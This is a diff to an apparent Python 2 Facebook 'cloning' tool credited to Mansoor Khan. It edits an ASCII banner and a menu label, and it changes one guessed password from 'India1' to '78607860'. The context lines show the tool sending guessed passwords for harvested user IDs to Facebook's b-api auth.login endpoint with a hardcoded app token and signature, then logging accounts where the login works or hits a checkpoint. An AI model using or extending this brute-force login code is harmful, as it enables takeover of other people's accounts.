@@ -51,13 +51,13 @@ def jalan(z):
 #Dev:Mansoor_Khan
 ##### LOGO #####
 logo = """
-        \033[1;97####:::::       ########           ####      ####
-      \033[1;97m####   :+:+:  ####   ####           ####    ####
-      \033[1;92m####       ####      ####           ####   ####
-      \033[1;92m####        ##       ####           ########
-      \033[1;92m####                 ####           ####    ####
-      \033[1;92m####                 ####           ####       ####
-      \033[1;92m####                 ####     ###   ####         ####
+       \033[1;97#### ####       #### ####      ####      ####
+      \033[1;97m####    ####  ####   ####      ####    ####
+      \033[1;92m####       ####      ####      ####   ####
+      \033[1;92m####        ##       ####      ########
+      \033[1;92m####                 ####      ####    ####
+      \033[1;92m####                 ####      ####     ####
+      \033[1;92m####                 #### ###  ####       ####
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;97mAuthor©\033[1;97m: \033[1;92mMansoor Khan
 \033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Man50or
@@ -246,7 +246,7 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From Friend List..."
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From My List..."
 	print "\033[1;97m--\033[1;92m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_super()
@@ -380,7 +380,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'India1'
+													pass6 = '78607860'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
